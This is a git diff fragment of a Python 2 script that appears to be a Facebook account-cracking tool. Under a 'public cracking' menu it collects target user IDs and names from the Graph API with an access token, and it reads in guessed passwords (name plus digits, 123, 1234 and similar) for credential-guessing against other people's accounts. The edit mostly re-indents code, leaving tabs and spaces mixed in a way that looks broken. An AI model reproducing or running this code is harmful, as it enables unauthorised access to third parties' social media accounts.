@@ -282,38 +282,30 @@ def pilih_super():
 			id.append(s['id'])
 		
 	elif peak =="2":
-		os.system('clear')
-		logo()
-		print '\033[1;31;1m~~~~ public cracking ~~~~'
-                print ''
-                print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
-                print ''
-                p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
-                pass4 = raw_input(' \033[1;92m[4]Password: ')
-		pass5 = raw_input(' \033[1;92m[5]Password: ')
-                pass6 = raw_input(' \033[1;92m[6]Password: ')
-                pass7 = raw_input(' \033[1;92m[7]Password: ')
-                pass8 = raw_input(' \033[1;92m[8]Password: ')
+		  os.system('clear')
+		  logo()
+		  print '\033[1;31;1m~~~~ public cracking ~~~~'
+                  print ''
+                  print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
+                  print ''
+                  p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                  p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                  p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+                  pass4 = raw_input(' \033[1;92m[4]Password: ')
+		  pass5 = raw_input(' \033[1;92m[5]Password: ')
+                  pass6 = raw_input(' \033[1;92m[6]Password: ')
+                  pass7 = raw_input(' \033[1;92m[7]Password: ')
+                  pass8 = raw_input(' \033[1;92m[8]Password: ')
 	try:
-		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-		op = json.loads(jok.text)
-		z = op['name']
-		os.system('clear')
-		logo()
-		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+q["name"]
-		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
-		for s in q['data']:
-		    id.append(s['id'])
-			
-		r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token='+ toket + '&limit=999999')
-                z = json.loads(r.text)
-                for i in z['data']:
-                    uid = i['id']
-                    na = i['name']
-                    nm = na.rsplit(' ')[0]
-                    id.append(uid + '|' + nm)
+		  jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+		  op = json.loads(jok.text)
+		  z = op['name']
+		  os.system('clear')
+		  logo()
+		  print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+q["name"]
+		  jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
+		  for s in q['data']:
+		      id.append(s['id'])
 	if peak =="3":
                 os.system('clear')
                 logo()
